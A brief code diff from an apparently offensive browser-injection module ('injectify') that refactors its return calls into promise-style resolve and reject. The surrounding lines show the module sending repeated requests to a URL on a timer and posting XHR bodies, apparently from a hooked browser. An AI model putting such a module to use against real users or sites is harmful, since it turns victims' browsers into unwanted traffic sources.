@@ -125,7 +125,7 @@ if (injectify.info.platform === 'browser') {
         req.src = url
         req.onload
       }, request.interval)
-      Module.return(true)
+      Module.resolve()
     } else {
       if (request.method === 'POST' && request.type === 'application/x-www-form-urlencoded') {
         /**
@@ -181,11 +181,11 @@ if (injectify.info.platform === 'browser') {
           }
           XHR.send(request.body)
         })()
-        Module.return(true)
+        Module.resolve()
       }
     }
   } else {
-    Module.return(false)
+    Module.reject('No url specified')
   }
 } else {
   /**
